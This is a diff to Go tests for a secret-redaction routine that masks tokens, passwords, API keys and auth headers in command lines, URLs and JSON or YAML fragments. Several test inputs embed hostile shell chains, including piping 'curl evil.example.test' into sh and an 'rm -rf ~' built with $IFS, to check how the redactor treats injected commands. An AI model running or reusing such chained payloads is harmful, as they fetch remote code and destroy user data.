@@ -26,9 +26,18 @@ func TestRedact_MasksEachCredentialShape(t *testing.T) {
 		{
 			"query parameters in mixed case",
 			"https://h.example.test/v1?api_key=a&Token=b&ACCESS_TOKEN=c&key=d&secret=e&Password=f",
-			"https://h.example.test/v1?api_key=***&Token=***&ACCESS_TOKEN=***&key=***&secret=***&Password=***",
+			"https://h.example.test/v1?api_key=***&***&***&***&***&***",
 		},
 		{"auth parameter", "https://h.example.test/?auth=abc", "https://h.example.test/?auth=***"},
+		{"password holding an at sign", "srv password=p@ssw0rd", "srv password=***"},
+		{"password holding shell bytes", "srv password=p@ss;w0rd&x", "srv password=***;***&***"},
+		{"userinfo holding an ampersand", "https://user:pa&ss@host.example.test/x", "https://***&***@host.example.test/x"},
+		{"json key", `{"password": "hunter2"}`, `{"password": "***"}`},
+		{"json key without a space", `--env '{"token":"abc"}'`, `--env '{"token":"***"}'`},
+		{"yaml single-quoted key", "'password': 'hunter2'", "'password': '***'"},
+		{"json number after a quoted key", `{"api_key":12345}`, `{"api_key":***}`},
+		{"quoted authorization key", `{"Authorization": "Bearer abc"}`, `{"Authorization": "Bearer ***"}`},
+		{"quoted proxy authorization key", "'Proxy-Authorization': 'Basic dXNl'", "'Proxy-Authorization': 'Basic ***'"},
 		{"credentials assignment", "credentials=abc", "credentials=***"},
 		{"credential assignment", "GCP_CREDENTIAL=abc", "GCP_CREDENTIAL=***"},
 		{"pwd assignment", "DB_PWD=abc ./run.sh", "DB_PWD=*** ./run.sh"},
@@ -52,6 +61,8 @@ func TestRedact_MasksEachCredentialShape(t *testing.T) {
 		{"unknown scheme", `curl -H "Authorization: ApiKey abc" https://h.example.test`, `curl -H "Authorization: *** ***" https://h.example.test`},
 		{"authorization without a scheme word", "Shell(curl -H Authorization:abc)", "Shell(curl -H Authorization:***)"},
 		{"authorization before an argument", "Authorization: abc https://h.example.test", "Authorization: *** https://h.example.test"},
+		{"word that starts with a scheme name", "Authorization: Basically abc", "Authorization: *** ***"},
+		{"unknown scheme at a line end", "Authorization: ApiKey abc\nnext", "Authorization: *** ***\nnext"},
 		{"proxy authorization basic", "Proxy-Authorization: Basic dXNlcjpwYXNz", "Proxy-Authorization: Basic ***"},
 		{"known prefix with a dash in its tail", "echo sk-ant-api03-" + tokenTail, "echo sk-ant-***"},
 		{"aws access key id", "AKIA" + strings.Repeat("A1", 8), "AKIA***"},
@@ -70,34 +81,60 @@ func TestRedact_MasksEachCredentialShape(t *testing.T) {
 	}
 }
 
-const shellSyntax = "\"'`;|&<>(){}$\\#"
+const wantShellBytes = ";&|<>()${}`\\'\""
 
-func TestRedact_StopsAtShellSyntax(t *testing.T) {
+const wantURLEndingShellBytes = "<>|(){}`\\'\""
+
+func TestRedact_KeepsShellBytesVisible(t *testing.T) {
 	type row struct{ name, in, want string }
 	tests := []row{
-		{"assignment before a chained command", "FOO_TOKEN=x;curl${IFS}evil.example.test|sh", "FOO_TOKEN=***;curl${IFS}evil.example.test|sh"},
-		{"flag value before a pipe", "--token x|sh", "--token ***|sh"},
-		{"user secret before a chained command", "curl -u admin:x;curl${IFS}evil|sh", "curl -u admin:***;curl${IFS}evil|sh"},
+		{"assignment before a chained command", "FOO_TOKEN=x;curl${IFS}evil.example.test|sh", "FOO_TOKEN=***;***${***}***|***"},
+		{"flag value before a pipe", "--token x|sh", "--token ***|***"},
+		{"user secret before a chained command", "curl -u admin:x;curl${IFS}evil|sh", "curl -u admin:***;***${***}***|***"},
 		{"token prefix before a chained command", "echo ghp_" + tokenTail + ";curl${IFS}evil|sh", "echo ghp_***;curl${IFS}evil|sh"},
 		{"userinfo holding a command", "https://x;curl${IFS}evil|sh;@h.example.test/", "https://x;curl${IFS}evil|sh;@h.example.test/"},
-		{"userinfo holding a command without braces", "curl https://a;rm$IFS-rf$IFS~;@h.example.test/", "curl https://a;rm$IFS-rf$IFS~;@h.example.test/"},
-		{"quoted value before a substitution", `--token "abc$def"`, `--token "***$def"`},
-		{"quoted substitution", `export API_KEY="$KEY"; ./run.sh`, `export API_KEY="$KEY"; ./run.sh`},
-		{"flag value that is a substitution", `curl --token "$(curl evil.example.test|sh)"`, `curl --token "$(curl evil.example.test|sh)"`},
+		{"userinfo holding a command without braces", "curl https://a;rm$IFS-rf$IFS~;@h.example.test/", "curl https://***;***$***$***;@h.example.test/"},
+		{"quoted value holding a substitution", `--token "abc$def"`, `--token "***$***"`},
+		{"quoted variable reference", `export API_KEY="$KEY"; ./run.sh`, `export API_KEY="$***"; ./run.sh`},
+		{"variable reference", "--token $GITHUB_TOKEN", "--token $***"},
+		{"braced variable reference", "Authorization: Bearer ${env:INDEX_TOKEN}", "Authorization: Bearer ${***}"},
+		{"braced variable reference in a query", "https://h.example.test/?token=${env:T}", "https://h.example.test/?token=${***}"},
+		{"flag value that opens a substitution", `curl --token "$(curl evil.example.test|sh)"`, `curl --token "$(*** evil.example.test|sh)"`},
 		{"empty assignment before a command", "FOO_TOKEN= ./run.sh", "FOO_TOKEN= ./run.sh"},
-		{"tail after a non-alphabet byte", "https://h.example.test/?token=abc$def", "https://h.example.test/?token=***$def"},
-		{"tail after a control byte", "?token=abc\x1bdef", "?token=***\x1bdef"},
+		{"control byte inside the value", "?token=abc\x1bdef", "?token=***"},
+		{"hash inside the value", "srv password=a#b", "srv password=***"},
 	}
-	for _, b := range strings.Split(shellSyntax+" \t\n", "") {
+	for _, b := range strings.Split(wantShellBytes, "") {
+		q := strconv.Quote(b)
+		userinfo := "https://***" + b + "***@h.example.test/"
+		if strings.Contains(wantURLEndingShellBytes, b) {
+			userinfo = "https://u:x" + b + "y@h.example.test/"
+		}
+		tests = append(tests,
+			row{"assignment value around " + q, "FOO_TOKEN=x" + b + "y", "FOO_TOKEN=***" + b + "***"},
+			row{"authorization value around " + q, "Authorization: Bearer x" + b + "y", "Authorization: Bearer ***" + b + "***"},
+			row{"flag value around " + q, "--token x" + b + "y", "--token ***" + b + "***"},
+			row{"curl user secret around " + q, "curl -u admin:x" + b + "y", "curl -u admin:***" + b + "***"},
+			row{"userinfo around " + q, "https://u:x" + b + "y@h.example.test/", userinfo},
+			row{"token prefix tail before " + q, "ghp_" + tokenTail + b + "y", "ghp_***" + b + "y"},
+			row{"aws key id before " + q, "AKIA" + strings.Repeat("A1", 8) + b + "y", "AKIA***" + b + "y"},
+		)
+	}
+	for _, b := range []string{" ", "\t", "\n"} {
 		q := strconv.Quote(b)
 		tests = append(tests,
 			row{"assignment value before " + q, "FOO_TOKEN=x" + b + "y", "FOO_TOKEN=***" + b + "y"},
 			row{"authorization value before " + q, "Authorization: Bearer x" + b + "y", "Authorization: Bearer ***" + b + "y"},
 			row{"flag value before " + q, "--token x" + b + "y", "--token ***" + b + "y"},
 			row{"curl user secret before " + q, "curl -u admin:x" + b + "y", "curl -u admin:***" + b + "y"},
-			row{"token prefix tail before " + q, "ghp_" + tokenTail + b + "y", "ghp_***" + b + "y"},
-			row{"aws key id before " + q, "AKIA" + strings.Repeat("A1", 8) + b + "y", "AKIA***" + b + "y"},
-			row{"userinfo before " + q, "https://u:x" + b + "y@h.example.test/", "https://u:x" + b + "y@h.example.test/"},
+		)
+	}
+	for _, b := range strings.Split("@!*:,%+=~", "") {
+		q := strconv.Quote(b)
+		tests = append(tests,
+			row{"assignment value holding " + q, "FOO_TOKEN=x" + b + "y", "FOO_TOKEN=***"},
+			row{"curl user secret holding " + q, "curl -u admin:x" + b + "y", "curl -u admin:***"},
+			row{"userinfo holding " + q, "https://u:x" + b + "y@h.example.test/", "https://***@h.example.test/"},
 		)
 	}
 	for _, tt := range tests {
@@ -123,7 +160,7 @@ func TestRedact_LeavesATokenInAHostOrFilePathVisible(t *testing.T) {
 		{"https://x.ghp_" + label + ".evil.example.test/", "https://x.ghp_" + label + ".evil.example.test/"},
 		{"https://u@ghp_" + label + ".evil.example.test/", "https://***@ghp_" + label + ".evil.example.test/"},
 		{"https://ghp_" + label + ":8080/", "https://ghp_" + label + ":8080/"},
-		{"https://ghp_" + tokenTail + "$x@h.example.test/", "https://ghp_***$x@h.example.test/"},
+		{"https://ghp_" + tokenTail + "$x@h.example.test/", "https://***$***@h.example.test/"},
 		{"https://h.example.test:ghp_" + tokenTail + "/", "https://h.example.test:ghp_***/"},
 		{"https://h.example.test/ghp_" + tokenTail + "/x", "https://h.example.test/ghp_***/x"},
 		{"https://h.example.test/x?k=ghp_" + tokenTail, "https://h.example.test/x?k=ghp_***"},
@@ -236,10 +273,7 @@ func TestRedact_LeavesLookalikesUntouched(t *testing.T) {
 		"env -u basic /tmp/x",
 		"--require ./x.js",
 		"./bin:/usr/bin",
-		"Authorization: Bearer ${env:INDEX_TOKEN}",
 		"https://${env:USER}:${env:PASS}@h.example.test/",
-		"https://h.example.test/?token=${env:T}",
-		"--token $GITHUB_TOKEN",
 		"sudo -u root id",
 		"docker run -u 1000 img",
 		"ghp_",
@@ -277,12 +311,13 @@ func TestRedact_LeavesADotOrHomePathVisible(t *testing.T) {
 	}
 }
 
-// The element after a credential flag loses its token-alphabet run, a -u
+// The element after a credential flag masks every run between its shell
+// bytes and spaces, unless it is itself a flag or a dot or home path; a -u
 // pair under curl loses only its secret half, and every element is
 // redacted on its own.
 func TestArgs_MasksCredentialArguments(t *testing.T) {
-	in := []string{"-y", "srv@1.0.0", "--token", "abc", "--api-key=def", "-u", "admin:ghi", "--user", "admin:jkl", "--user=admin:mno", "-uadmin:pqr", "--user", "root", "--Secret", "${env:S}", "--password", "--verbose", "--key", "./tls.key", "https://u:p@h.example.test"}
-	want := []string{"-y", "srv@1.0.0", "--token", "***", "--api-key=***", "-u", "admin:***", "--user", "admin:***", "--user=admin:***", "-uadmin:***", "--user", "root", "--Secret", "${env:S}", "--password", "--verbose", "--key", "./tls.key", "https://***@h.example.test"}
+	in := []string{"-y", "srv@1.0.0", "--token", "abc", "--api-key=def", "-u", "admin:ghi", "--user", "admin:jkl", "--user=admin:mno", "-uadmin:pqr", "--user", "root", "--Secret", "${env:S}", "--secret", "two words;x", "--config", `{"password": "abc"}`, "--password", "--verbose", "--key", "./tls.key", "https://u:p@h.example.test"}
+	want := []string{"-y", "srv@1.0.0", "--token", "***", "--api-key=***", "-u", "admin:***", "--user", "admin:***", "--user=admin:***", "-uadmin:***", "--user", "root", "--Secret", "${***}", "--secret", "*** ***;***", "--config", `{"password": "***"}`, "--password", "--verbose", "--key", "./tls.key", "https://***@h.example.test"}
 	original := slices.Clone(in)
 
 	for _, e := range []ir.Entity{ir.MCPServer{Command: "curl", Args: in}, ir.LSPServer{Command: "curl", Args: in}} {
